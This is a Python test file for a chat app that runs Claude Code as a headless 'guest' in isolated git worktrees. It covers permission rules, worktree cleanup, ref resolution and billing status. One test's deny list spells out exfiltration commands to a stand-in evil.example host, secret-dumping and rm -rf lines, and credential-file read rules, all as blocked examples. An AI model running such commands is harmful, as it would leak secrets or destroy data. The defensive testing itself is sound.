    assert "checked out (detached) at ref feature/x" in captured["options"].system_prompt


def test_concurrent_ref_resolution_no_fetch_head_race(monkeypatch):
    """Two jobs resolving DIFFERENT targets against the same primary repo must
    each get their OWN commit — never whichever fetch ran last. Regression for
    the shared-FETCH_HEAD race: a fake git forces both fetches to complete
    (a barrier) BEFORE either resolves, and pins FETCH_HEAD to a poison value —
    so any code path that read the shared FETCH_HEAD would return the wrong
    commit. The fix fetches each target into its own job-keyed private ref."""
    import threading
    import types
    from pathlib import Path as _P

    src_to_sha = {"branch-a": "a" * 40, "pull/7/head": "b" * 40}
    poison = "d" * 40
    barrier = threading.Barrier(2)
    refs = {}
    lock = threading.Lock()

    def fake_git(repo, *args, timeout=60):
        def R(rc=0, out="", err=""):
            return types.SimpleNamespace(returncode=rc, stdout=out, stderr=err)
        if args[0] == "fetch":
            src, _, dst = args[-1].partition(":")   # "<src>:<private-ref>"
            with lock:
                refs[dst] = src_to_sha[src]         # our OWN isolated ref
            barrier.wait()          # both fetches land before either resolves
            return R()
        if args[0] == "rev-parse":
            target = args[-1]
            if target == "FETCH_HEAD":
                return R(out=poison)                # the trap: shared, clobbered
            with lock:
                sha = refs.get(target, "")
            return R(rc=0 if sha else 1, out=sha)
        if args[0] == "update-ref":                 # -d <ref>
            with lock:
                refs.pop(args[-1], None)
            return R()
        return R()

    monkeypatch.setattr(guest, "_git", fake_git)
    out = {}

    def run(name, ref, key):
        out[name] = guest._resolve_ref(_P("/repo"), ref, key)

    tA = threading.Thread(target=run, args=("A", "branch-a", "jobA"))
    tB = threading.Thread(target=run, args=("B", "7", "jobB"))
    tA.start(); tB.start(); tA.join(5); tB.join(5)

    # each resolution got its OWN target, not the last fetch or the poison
    assert out["A"] == ("a" * 40, "ref branch-a")
    assert out["B"] == ("b" * 40, "PR #7")
    assert poison not in (out["A"][0], out["B"][0])
    # both private refs were cleaned up (finally ran) — no cross-deletion, no leak
    assert refs == {}


def test_verified_model_from_session_beats_requested_tier(tmp_path, monkeypatch):
    """The core of it: the chat surfaces the model Claude Code ACTUALLY ran, sourced
    from its session metadata — resolving a requested "default" to the concrete
    model — not the caller's intent."""
    import claude_agent_sdk as sdk
    captured = {}

    def fake_query(*, prompt, options=None, transport=None):
        captured["options"] = options

        async def gen():
            yield sdk.AssistantMessage(
                content=[sdk.TextBlock(text="done")],
                model="claude-sonnet-4-5-20250929")
            yield sdk.ResultMessage(
                subtype="success", duration_ms=1, duration_api_ms=1,
                is_error=False, num_turns=1, session_id="s-9",
                total_cost_usd=0.05,
                usage={"input_tokens": 5, "output_tokens": 2},
                model_usage={"claude-sonnet-4-5-20250929": {"input_tokens": 5}},
                result="done")
        return gen()

    class FakeSdk:
        ClaudeAgentOptions = sdk.ClaudeAgentOptions
        AssistantMessage = sdk.AssistantMessage
        UserMessage = sdk.UserMessage
        ResultMessage = sdk.ResultMessage
        StreamEvent = sdk.StreamEvent
        TextBlock = sdk.TextBlock
        ToolUseBlock = sdk.ToolUseBlock
        ToolResultBlock = sdk.ToolResultBlock
        query = staticmethod(fake_query)

    monkeypatch.setattr(guest, "_sdk", lambda: FakeSdk)
    _git_repo(tmp_path)
    cfg = {"code_repos": {"demo": str(tmp_path)}}

    async def drain():
        return [ev async for ev in guest.run_guest(
            "t", "demo", "ctx", cfg, model="default", effort="think")]

    events = asyncio.run(drain())
    text = "".join(p for k, p in events if k == "text")
    usage = next(p for k, p in events if k == "usage")
    # requested tier was "default"; the MODEL is verified from the session
    assert usage["model_alias"] == "default"
    assert usage["verified_model"] == "claude-sonnet-4-5-20250929"
    assert usage["model"] == "claude-sonnet-4-5-20250929"  # header shows it
    # the readout is appended to the reply — always visible in-chat — and it
    # scopes "verified" to the MODEL only (read back from the session)…
    assert "claude-sonnet-4-5-20250929` (verified from Claude Code's session)" in text
    # …while the EFFORT is labelled requested/applied, NOT verified (the SDK
    # never reports thinking-token usage back — see the overclaim fix).
    assert "effort **think** (requested" in text
    assert "effort **think** (verified" not in text


def test_status_reports_why_unavailable():
    s = guest.status({"code_repos": {}})
    assert s["available"] is False and s["reason"]


def test_status_use_api_key_reflects_real_billing_path(tmp_path, monkeypatch):
    """status().use_api_key must match run_guest's actual decision: metered
    ONLY when code_use_api_key is set AND a key exists — so the UI drift
    indicator never cries wolf and never stays silent on real drift."""
    cfg = {"code_repos": {"demo": str(tmp_path)}}
    # subscription: flag off (even with a key present)
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-x")
    assert guest.status(cfg)["use_api_key"] is False
    # metered: flag on AND key present
    assert guest.status({**cfg, "code_use_api_key": True})["use_api_key"] is True
    # flag on but NO key → still subscription (can't bill a key that isn't there)
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    assert guest.status({**cfg, "code_use_api_key": True})["use_api_key"] is False


def test_status_use_api_key_present_even_when_unavailable(monkeypatch):
    """The billing field must ride EVERY status() return, not just the available
    one — otherwise a machine without the Claude Code CLI (e.g. CI) KeyErrors on
    it. This is the regression that turned CI red."""
    monkeypatch.setattr(guest, "_cli_present", lambda: False)
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-x")
    s = guest.status({"code_repos": {"demo": "/x"}, "code_use_api_key": True})
    assert s["available"] is False and s["reason"]
    assert s["use_api_key"] is True   # key present despite unavailable


def test_style_contract_reaches_every_guest_mode():
    """The brevity + ask-before-you-assume contract is framework-level: both
    system prompts carry it, and any future adapter must append GUEST_STYLE."""
    for prompt in (guest.GUEST_SYSTEM, guest.GUEST_SYSTEM_IMPLEMENT):
        assert "Ask before you assume" in prompt
        assert "END IN QUESTIONS" in prompt
        assert "~200 words" in prompt
    # and it survives .format() (no stray braces)
    guest.GUEST_SYSTEM.format(user_name="A", repo="r", path="/p")
    guest.GUEST_SYSTEM_IMPLEMENT.format(user_name="A", repo="r", path="/p")
    # the resident models are taught the relay loop
    from backend import tools as tools_mod
    defs = tools_mod.code_tool_definitions({"code_repos": {"a": "/x"}})
    assert "clarifying questions" in defs[0]["description"]


# ---------- implement mode (phase 2: the guest ships PRs) ----------

def test_implement_requires_code_allow_writes():
    cfg = {"chat_id": 1, "code_repos": {"demo": "/tmp/x"}}
    out = guest.request(1, {"task": "fix the orb tint lag",
                            "mode": "implement"}, cfg)
    assert "Error" in out and "code_allow_writes" in out
    assert guest.take(1) is None  # nothing queued
    cfg["code_allow_writes"] = True
    ok = guest.request(1, {"task": "fix the orb tint lag", "mode": "implement",
                           "continue_last": True}, cfg)
    assert "pull request" in ok
    summons = guest.take(1)
    assert summons["mode"] == "implement" and summons["continue_last"] is True


def test_bogus_mode_rejected():
    cfg = {"chat_id": 1, "code_repos": {"demo": "/tmp/x"}}
    assert "mode must be" in guest.request(1, {"task": "do something nice",
                                               "mode": "yolo"}, cfg)


def test_run_guest_implement_options(tmp_path, monkeypatch):
    import claude_agent_sdk as sdk
    captured = {}

    def fake_query(*, prompt, options=None, transport=None):
        captured["prompt"] = prompt
        captured["options"] = options

        async def gen():
            yield sdk.ResultMessage(
                subtype="success", duration_ms=1, duration_api_ms=1,
                is_error=False, num_turns=1, session_id="s-2",
                total_cost_usd=0.2, usage={"input_tokens": 5, "output_tokens": 2},
                result="done")
        return gen()

    class FakeSdk:
        ClaudeAgentOptions = sdk.ClaudeAgentOptions
        AssistantMessage = sdk.AssistantMessage
        UserMessage = sdk.UserMessage
        ResultMessage = sdk.ResultMessage
        StreamEvent = sdk.StreamEvent
        TextBlock = sdk.TextBlock
        ToolUseBlock = sdk.ToolUseBlock
        ToolResultBlock = sdk.ToolResultBlock
        query = staticmethod(fake_query)

    monkeypatch.setattr(guest, "_sdk", lambda: FakeSdk)
    _git_repo(tmp_path)
    cfg = {"user_name": "Alex", "code_repos": {"demo": str(tmp_path)},
           "code_allow_writes": True, "code_impl_max_turns": 99,
           "code_impl_timeout_s": 60}

    async def drain():
        return [ev async for ev in guest.run_guest(
            "ship it", "demo", "", cfg, mode="implement", resume="s-1")]

    events = asyncio.run(drain())
    opts = captured["options"]
    assert "Edit" in opts.tools and "Bash" in opts.tools
    assert "Bash(git push:*)" in opts.allowed_tools
    assert "Bash(gh pr create:*)" in opts.allowed_tools
    # the hard lines: no merging, no main, no force, no editing its own gate
    assert "Bash(gh pr merge:*)" in opts.disallowed_tools
    assert "Bash(git push origin main:*)" in opts.disallowed_tools
    assert "Edit(.github/**)" in opts.disallowed_tools
    assert "Write(.github/**)" in opts.disallowed_tools
    assert ".github" in opts.system_prompt  # and it's told why
    # headless permissioning is self-contained, not the operator's global
    # settings, and un-approved commands are denied rather than left hanging.
    assert opts.permission_mode == "dontAsk"
    assert opts.setting_sources == ["project"]  # keeps CLAUDE.md, drops ~/.claude
    assert opts.max_turns == 99 and opts.resume == "s-1"
    assert "pull request" in opts.system_prompt and "NEVER push to main" in opts.system_prompt
    assert "continue from your previous visit" in captured["prompt"]
    usage = next(p for k, p in events if k == "usage")
    assert usage["repo"] == "demo" and usage["session_id"] == "s-2"


def test_implement_downgrades_to_read_only_if_writes_flag_off(tmp_path, monkeypatch):
    """A queued implement summons must not gain write tools if the config flag
    was flipped off before the guest ran — options fall back to read-only."""
    import claude_agent_sdk as sdk
    captured = {}

    def fake_query(*, prompt, options=None, transport=None):
        captured["options"] = options

        async def gen():
            if False:
                yield  # pragma: no cover
        return gen()

    class FakeSdk:
        ClaudeAgentOptions = sdk.ClaudeAgentOptions
        AssistantMessage = sdk.AssistantMessage
        UserMessage = sdk.UserMessage
        ResultMessage = sdk.ResultMessage
        StreamEvent = sdk.StreamEvent
        ToolUseBlock = sdk.ToolUseBlock
        ToolResultBlock = sdk.ToolResultBlock
        query = staticmethod(fake_query)

    monkeypatch.setattr(guest, "_sdk", lambda: FakeSdk)
    _git_repo(tmp_path)
    cfg = {"code_repos": {"demo": str(tmp_path)}}  # no code_allow_writes

    async def drain():
        return [ev async for ev in guest.run_guest("x", "demo", "", cfg,
                                                   mode="implement")]

    asyncio.run(drain())
    opts = captured["options"]
    assert opts.tools == ["Read", "Grep", "Glob"] and "Bash" in opts.disallowed_tools


def test_continue_last_resumes_prior_session_and_repo(app, monkeypatch):
    monkeypatch.setattr(engine.providers, "stream_reply", fake_stream(["ok"]))
    seen = {}

    def capture_guest(task, repo_key, context, cfg, mode="investigate",
                      resume=None, chat_id=0, model="", effort="",
                      session_key=None, ref=""):
        seen.update(task=task, repo=repo_key, mode=mode, resume=resume,
                    model=model, effort=effort, session_key=session_key, ref=ref)
        return fake_guest([("text", "resumed and shipped")])(task, repo_key,
                                                             context, cfg)

    monkeypatch.setattr(engine.guest, "run_guest", capture_guest)
    with TestClient(app, base_url="http://127.0.0.1") as c:
        chat = c.post("/api/chats", json={}).json()
        c.patch(f"/api/chats/{chat['id']}", json={"code_enabled": True})
        # a previous guest visit persisted with its session handle + repo
        con = db.connect()
        con.execute(
            "INSERT INTO messages(chat_id, speaker, content, usage_json, created_at) "
            "VALUES(?,?,?,?,?)",
            (chat["id"], "claude-code", "the plan",
             json.dumps({"session_id": "sess-9", "repo": "demo"}), db.now()))
        con.commit()
        con.close()
        guest.request(chat["id"],
                      {"task": "implement the plan you made", "mode": "implement",
                       "continue_last": True, "repo": "demo"},
                      {"code_repos": {"demo": "/tmp"}, "code_allow_writes": True,
                       "chat_id": chat["id"]})
        with c.stream("POST", f"/api/chats/{chat['id']}/send", json={"text": "go"}) as r:
            "".join(r.iter_text())
    assert seen["resume"] == "sess-9" and seen["repo"] == "demo"
    assert seen["mode"] == "implement"


def test_continue_last_reuses_prior_worktree_key(app, monkeypatch):
    """A resumed visit must land in the SAME cwd as the visit it continues — the
    CLI's session lookup is keyed by working directory — so the stored
    worktree_key is threaded back as the new visit's session_key. Without
    this a resume would get a fresh isolated path and lose its working context."""
    monkeypatch.setattr(engine.providers, "stream_reply", fake_stream(["ok"]))
    seen = {}

    def capture_guest(task, repo_key, context, cfg, mode="investigate",
                      resume=None, chat_id=0, model="", effort="",
                      session_key=None, ref=""):
        seen.update(resume=resume, session_key=session_key)
        return fake_guest([("text", "resumed")])(task, repo_key, context, cfg)

    monkeypatch.setattr(engine.guest, "run_guest", capture_guest)
    with TestClient(app, base_url="http://127.0.0.1") as c:
        chat = c.post("/api/chats", json={}).json()
        c.patch(f"/api/chats/{chat['id']}", json={"code_enabled": True})
        con = db.connect()
        con.execute(
            "INSERT INTO messages(chat_id, speaker, content, usage_json, created_at) "
            "VALUES(?,?,?,?,?)",
            (chat["id"], "claude-code", "the plan",
             json.dumps({"session_id": "sess-9", "repo": "demo",
                         "worktree_key": 4242}), db.now()))
        con.commit()
        con.close()
        guest.request(chat["id"],
                      {"task": "keep going on the plan", "mode": "implement",
                       "continue_last": True, "repo": "demo"},
                      {"code_repos": {"demo": "/tmp"}, "code_allow_writes": True,
                       "chat_id": chat["id"]})
        with c.stream("POST", f"/api/chats/{chat['id']}/send", json={"text": "go"}) as r:
            "".join(r.iter_text())
    assert seen["resume"] == "sess-9"
    assert seen["session_key"] == 4242   # the SAME worktree as the prior visit


# ---------- permission classes ----------
#
# The guest runs headless (permission_mode="dontAsk"): a Bash command runs ONLY
# if some allowed rule matches it and NO denied rule does; otherwise it is
# denied outright. These tests mirror Claude Code's prefix matching against the
# real IMPLEMENT_ALLOWED/IMPLEMENT_DENIED so the allow/deny CLASSES are proven,
# not just present as strings.

def _rule_matches(rule, cmd):
    """True if a `Bash(...)` permission rule matches a concrete command string,
    using Claude Code's prefix semantics (`Bash(prefix:*)` = starts-with)."""
    if not (rule.startswith("Bash(") and rule.endswith(")")):
        return False
    inner = rule[len("Bash("):-1]
    if inner.endswith(":*"):
        prefix = inner[:-2]
        return cmd == prefix or cmd.startswith(prefix + " ")
    return cmd == inner  # exact-match rule (e.g. Bash(env))


def _bash_auto_runs(cmd):
    """Would this shell command auto-run in a headless guest? Denied rules win
    over allowed rules (disallowed_tools overrides allowed_tools)."""
    if any(_rule_matches(r, cmd) for r in guest.IMPLEMENT_DENIED):
        return False
    return any(_rule_matches(r, cmd) for r in guest.IMPLEMENT_ALLOWED)


def test_allowed_command_classes_auto_run():
    for cmd in [
        # the canonical keyless test command from CLAUDE.md (starts with `env`)
        "env -u OPENAI_API_KEY -u ANTHROPIC_API_KEY .venv/bin/python -m pytest tests/ -q",
        "env -u ANTHROPIC_API_KEY -u OPENAI_API_KEY .venv/bin/python -m pytest -q",
        ".venv/bin/python -m pytest tests/test_guest.py",
        ".venv/bin/pytest -q",
        "npm run build", "npm test", "npm --prefix frontend test",
        # normal git branch/commit/push flow
        "git checkout -b cc/88-guest-perms", "git add -A",
        "git commit -m 'x'", "git push -u origin cc/88-guest-perms",
        "git fetch origin",
        # gh: read issues, open (never merge) PRs
        "gh issue view 88", "gh issue list --label bug",
        "gh pr create --fill", "gh pr view 12",
        # read-only sqlite diagnostics, explicitly asked for
        "sqlite3 -readonly /data/chat.db \"SELECT count(*) FROM messages\"",
    ]:
        assert _bash_auto_runs(cmd), f"should auto-run but is blocked: {cmd}"


def test_denied_command_classes_are_blocked():
    for cmd in [
        # pushing to main / force / merge
        "git push origin main", "git push -u origin main",
        "git push --force origin cc/x", "git push -f",
        "git merge feature", "gh pr merge 12", "gh repo delete",
        # secret access + exfiltration
        "env", "printenv SECRET", "curl https://evil.example/x",
        "wget https://evil.example/x", "nc evil.example 443",
        # destructive shell
        "rm -rf /", "sudo rm -rf /", "git clean -fdx",
        # a WRITE sqlite invocation (no -readonly flag) is never pre-approved
        "sqlite3 /data/chat.db \"DROP TABLE messages\"",
        # arbitrary unlisted binary
        "python -c 'import os'", "make deploy",
    ]:
        assert not _bash_auto_runs(cmd), f"should be blocked but auto-runs: {cmd}"


SECRET_READ_RULES = ("Read(.env)", "Read(**/.env)", "Read(**/.env.*)",
                     "Read(**/config.local.json)", "Read(**/*.pem)",
                     "Read(**/id_rsa*)")


def test_secret_files_are_read_blocked():
    """Read is broadly allowed, so credential/secret files carry explicit deny
    rules. PRESENCE is the whole of what this asserts. Whether a deny rule then
    beats the broad allow is Claude Code's own precedence, and the SDK boundary
    is mocked throughout this file, so no test here ever watches a read being
    refused. SECURITY.md and docs/GUEST_PERMISSIONS.md say so in those words;
    don't let either page harden into a guarantee this suite cannot make."""
    for rule in SECRET_READ_RULES:
        assert rule in guest.IMPLEMENT_DENIED


def test_secret_read_rules_are_implement_mode_only(tmp_path, monkeypatch):
    """Pin the ASYMMETRY, in both directions, from the options the SDK is
    actually handed — not from the constants alone.

    The credential-file rules live in IMPLEMENT_DENIED and nowhere else.
    Investigate mode's denied list (DENIED_TOOLS) names whole tools and carries
    no Read rule at all, so a read-only guest is read-only about the REPO, not
    about secrets. SECURITY.md, ARCHITECTURE.md and docs/GUEST_PERMISSIONS.md
    all describe it that way; this test is what keeps them honest. If someone
    extends the rules to both modes, this test goes red and the docs get
    corrected in the same change instead of drifting back into a promise the
    code doesn't keep."""
    captured = _capturing_sdk(monkeypatch, tmp_path)

    def run(**kw):
        async def drain():
            return [ev async for ev in guest.run_guest(
                "t", "demo", "", {"code_repos": {"demo": str(tmp_path)},
                                  "code_allow_writes": True}, **kw)]
        asyncio.run(drain())
        return captured["options"]

    impl = run(mode="implement")
    for rule in SECRET_READ_RULES:
        assert rule in impl.disallowed_tools, (
            f"implement mode must keep {rule} on its deny list")

    inv = run(mode="investigate")
    assert "Read" in inv.allowed_tools          # broadly allowed…
    assert not [r for r in inv.disallowed_tools if r.startswith("Read")], (
        "investigate mode carries NO Read rule; if that changed, say so in "
        "SECURITY.md and docs/GUEST_PERMISSIONS.md before changing this test")
    # …and the searching tools are unrestricted in BOTH modes, which is why the
    # docs stop short of calling the file rules a guarantee.
    for opts in (impl, inv):
        assert not [r for r in opts.disallowed_tools
                    if r.startswith(("Grep(", "Glob("))]


DOCS_LISTING_READ_RULES = ("SECURITY.md", "docs/GUEST_PERMISSIONS.md")


def test_credential_deny_rules_are_listed_identically_in_both_docs():
    """SECURITY.md and docs/GUEST_PERMISSIONS.md both spell out the credential
    Read rules, and they drifted into different subsets (SECURITY.md was missing
    Read(**/.env)). Two pages disagreeing is worse than one page being wrong,
    because the disagreement reads as one of them being the current one. Pin
    both against IMPLEMENT_DENIED so a rule cannot be added, removed or renamed
    with only one page updated.

    This proves the two lists AGREE with the code. It does not prove the CLI
    enforces any of them; nothing in this repository does."""
    import re
    from pathlib import Path as _P

    root = _P(__file__).resolve().parents[1]
    in_code = {r for r in guest.IMPLEMENT_DENIED if r.startswith("Read(")}
    assert in_code, "IMPLEMENT_DENIED lost its Read rules entirely"
    for name in DOCS_LISTING_READ_RULES:
        in_doc = set(re.findall(r"Read\([^)`]*\)", (root / name).read_text()))
        assert in_doc == in_code, (
            f"{name} lists {sorted(in_doc)}, IMPLEMENT_DENIED has "
            f"{sorted(in_code)}; update both pages in the same change")


# ---------- worktree isolation ----------

import shutil
import subprocess


def _git_repo(path):
    """Make tmp_path a real (tiny) git repo so worktree ops are honest."""
    def g(*a):
        subprocess.run(["git", "-C", str(path), *a], check=True,
                       capture_output=True,
                       env={**__import__("os").environ,
                            "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
                            "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"})
    subprocess.run(["git", "init", "-q", "-b", "main", str(path)], check=True)
    (path / "README.md").write_text("hi")
    g("add", "-A")
    g("commit", "-qm", "init")


def test_worktree_isolates_and_cleans_up(tmp_path):
    _git_repo(tmp_path)
    wt = guest._add_worktree(tmp_path, "demo", 42)
    assert wt.is_dir() and (wt / "README.md").exists()
    assert wt != tmp_path  # never the primary checkout
    # detached: a guest branch in the worktree can't move the main checkout
    head = (wt / ".git")
    assert head.exists()
    guest._remove_worktree(tmp_path, wt)
    assert not wt.exists()


def test_worktree_recreated_after_crash(tmp_path):
    _git_repo(tmp_path)
    wt1 = guest._add_worktree(tmp_path, "demo", 43)
    (wt1 / "half-done.txt").write_text("crash leftovers")
    # no cleanup ran (simulated crash) — next visit must still succeed
    wt2 = guest._add_worktree(tmp_path, "demo", 43)
    assert wt2 == wt1 and not (wt2 / "half-done.txt").exists()
    guest._remove_worktree(tmp_path, wt2)


def test_leftover_directory_git_cannot_remove_does_not_wedge_the_next_visit(tmp_path):
    """A leftover worktree DIRECTORY that git no longer has registered used to
    wedge that repo+chat forever. `worktree remove` refuses a path this repo
    doesn't own, `prune` leaves the directory alone, and `worktree add` then
    fails on the non-empty path — so every later visit reported "[Claude Code
    could not join: …]" until a human deleted it by hand. It is reachable in
    normal use: teardown is capped at GUEST_TEARDOWN_S and abandoned when it
    overruns, which is exactly how a registration-less directory gets left
    behind. The next visit must clear it and check out cleanly."""
    _git_repo(tmp_path)
    dest = guest._worktree_path("demo", 950003)
    dest.mkdir(parents=True, exist_ok=True)
    (dest / "leftover.txt").write_text("from a visit that never tore down")
    assert not (dest / ".git").exists()  # never registered — git can't remove it
    try:
        wt = guest._add_worktree(tmp_path, "demo", 950003)
        assert wt == dest
        assert (wt / "README.md").exists()        # a real checkout...
        assert not (wt / "leftover.txt").exists()  # ...not the leftover
    finally:
        guest._remove_worktree(tmp_path, dest)
        shutil.rmtree(dest, ignore_errors=True)


def test_force_clear_refuses_a_path_outside_the_guest_worktree_namespace(tmp_path):
    """The force-clear is scoped to the temp-dir namespace _worktree_path hands
    out. Anything else is left untouched, so no upstream bug can turn this into
    an arbitrary rmtree."""
    victim = tmp_path / "not-a-guest-worktree"
    victim.mkdir()
    (victim / "keep.txt").write_text("must survive")

    guest._force_clear_leftover(victim)

    assert (victim / "keep.txt").exists()


def _git_repo_with_origin(tmp_path):
    """A repo whose `origin` bare remote has advanced PAST the local checkout —
    the exact stale-local-main setup that made a reviewer read pre-PR code and
    report false "the PR doesn't exist" blockers."""
    def g(repo, *a):
        subprocess.run(["git", "-C", str(repo), *a], check=True,
                       capture_output=True,
                       env={**__import__("os").environ,
                            "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
                            "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"})
    bare, work, other = (tmp_path / "origin.git", tmp_path / "work",
                         tmp_path / "other")
    subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(bare)],
                   check=True)
    subprocess.run(["git", "clone", "-q", str(bare), str(work)], check=True)
    (work / "README.md").write_text("hi")
    g(work, "add", "-A"); g(work, "commit", "-qm", "init")
    g(work, "push", "-q", "origin", "main")
    # a SECOND clone lands a new commit on origin/main that `work` hasn't fetched
    subprocess.run(["git", "clone", "-q", str(bare), str(other)], check=True)
    (other / "pr_only.txt").write_text("the PR's real content")
    g(other, "add", "-A"); g(other, "commit", "-qm", "pr change")
    g(other, "push", "-q", "origin", "main")
    return work


def test_worktree_path_is_session_keyed():
    """Pure derivation: repo+chat pins the home path; a session_key gives each
    concurrent/independent session its OWN distinct path; the same key resolves
    to the same path (so a resume lands back in its cwd)."""
    home = guest._worktree_path("demo", 5)
    assert guest._worktree_path("demo", 5, None) == home  # bare/legacy shape
    a = guest._worktree_path("demo", 5, "job7")
    b = guest._worktree_path("demo", 5, "job8")
    assert a != home and b != home and a != b        # each session isolated
    assert guest._worktree_path("demo", 5, "job7") == a  # stable → resume-safe
    assert a.name.endswith("-job7")


def test_concurrent_sessions_get_distinct_worktrees_scoped_cleanup(tmp_path):
    """Two concurrent sessions (here modelled as two chats — same-chat runs are
    serialized) get separate checkouts, and tearing one down leaves the
    other intact: cleanup is scoped to a session's own worktree, never a
    neighbour's."""
    _git_repo(tmp_path)
    wt_a = guest._add_worktree(tmp_path, "demo", 900101, "sessA")
    wt_b = guest._add_worktree(tmp_path, "demo", 900102, "sessB")
    try:
        assert wt_a != wt_b and wt_a.is_dir() and wt_b.is_dir()
        assert (wt_a / "README.md").exists() and (wt_b / "README.md").exists()
        guest._remove_worktree(tmp_path, wt_a)      # tear down only A
        assert not wt_a.exists() and wt_b.is_dir()  # B is untouched
    finally:
        guest._remove_worktree(tmp_path, wt_a)
        guest._remove_worktree(tmp_path, wt_b)


def test_stale_sibling_from_crash_is_reclaimed(tmp_path):
    """A hard-killed visit skips its teardown and leaves an orphan worktree.
    Because same-chat runs are serialized, the NEXT visit's sweep reclaims that
    sibling rather than leaking it — per-session paths are otherwise never
    reused."""
    _git_repo(tmp_path)
    leaked = guest._add_worktree(tmp_path, "demo", 900301, "deadsess")
    (leaked / "crash.txt").write_text("left behind")  # no cleanup ran
    fresh = guest._add_worktree(tmp_path, "demo", 900301, "livesess")
    try:
        assert fresh != leaked
        assert not leaked.exists()   # reclaimed — no orphan checkout leaks
        assert fresh.is_dir() and (fresh / "README.md").exists()
    finally:
        guest._remove_worktree(tmp_path, fresh)
        guest._remove_worktree(tmp_path, leaked)


def test_worktree_bases_on_fetched_origin_main_not_stale_local(tmp_path):
    """The stale-HEAD fix: _add_worktree fetches and bases the checkout
    on origin/main, so a review session sees the ref's ACTUAL current commit —
    not the pre-PR content the deploy checkout's stale local main still had."""
    work = _git_repo_with_origin(tmp_path)
    assert not (work / "pr_only.txt").exists()   # local checkout is behind origin
    wt = guest._add_worktree(work, "demo", 900401, "s1")
    try:
        assert (wt / "pr_only.txt").read_text() == "the PR's real content"
    finally:
        guest._remove_worktree(work, wt)


def test_non_repo_fails_loudly_not_shared(tmp_path):
    """If worktree creation fails, the visit is refused — never silently run
    two writers on the shared checkout again."""
    async def drain():
        return [ev async for ev in guest.run_guest(
            "task here", "demo", "", {"code_repos": {"demo": str(tmp_path)}})]
    events = asyncio.run(drain())
    assert events and "could not join" in events[0][1]


def test_code_default_on_config(tmp_path):
    """code_default_on flips the default for NEW chats only; existing chats
    and the public default (off) are untouched."""
    settings = Settings(data_dir=str(tmp_path / "d1"),
                        memory_url="http://127.0.0.1:1", code_default_on=True)
    with TestClient(create_app(settings), base_url="http://127.0.0.1") as c:
        assert c.post("/api/chats", json={}).json()["code_enabled"] == 1
    settings = Settings(data_dir=str(tmp_path / "d2"),
                        memory_url="http://127.0.0.1:1")
    with TestClient(create_app(settings), base_url="http://127.0.0.1") as c:
        assert c.post("/api/chats", json={}).json()["code_enabled"] == 0


def test_continue_last_repo_mismatch_starts_fresh_and_says_so(app, monkeypatch):
    """A stored session is bound to one repo's worktree. When continue_last
    points at a visit in a different repo than the summon asks for, the
    explicit repo must win and the resume must be dropped — silently
    overriding stranded a guest in the wrong checkout, and the guest
    message must say why the working context was not carried over."""
    monkeypatch.setattr(engine.providers, "stream_reply", fake_stream(["ok"]))
    seen = {}

    def capture_guest(task, repo_key, context, cfg, mode="investigate",
                      resume=None, chat_id=0, model="", effort="",
                      session_key=None, ref=""):
        seen.update(repo=repo_key, resume=resume)
        return fake_guest([("text", "fresh start")])(task, repo_key,
                                                     context, cfg)

    monkeypatch.setattr(engine.guest, "run_guest", capture_guest)
    with TestClient(app, base_url="http://127.0.0.1") as c:
        chat = c.post("/api/chats", json={}).json()
        c.patch(f"/api/chats/{chat['id']}", json={"code_enabled": True})
        con = db.connect()
        con.execute(
            "INSERT INTO messages(chat_id, speaker, content, usage_json, created_at) "
            "VALUES(?,?,?,?,?)",
            (chat["id"], "claude-code", "the plan",
             json.dumps({"session_id": "sess-9", "repo": "demo"}), db.now()))
        con.commit()
        con.close()
        guest.request(chat["id"],
                      {"task": "patch the other repo", "mode": "investigate",
                       "continue_last": True, "repo": "other"},
                      {"code_repos": {"demo": "/tmp", "other": "/tmp"},
                       "chat_id": chat["id"]})
        with c.stream("POST", f"/api/chats/{chat['id']}/send", json={"text": "go"}) as r:
            "".join(r.iter_text())
        con = db.connect()
        row = con.execute(
            "SELECT content FROM messages WHERE chat_id=? AND speaker=? "
            "ORDER BY id DESC LIMIT 1", (chat["id"], "claude-code")).fetchone()
        con.close()
    assert seen["resume"] is None, "mismatched-repo resume must be dropped"
    assert seen["repo"] == "other", "the explicit repo must win"
    assert "continue_last ignored" in row["content"], \
        "the chat must be told the context was not carried over"
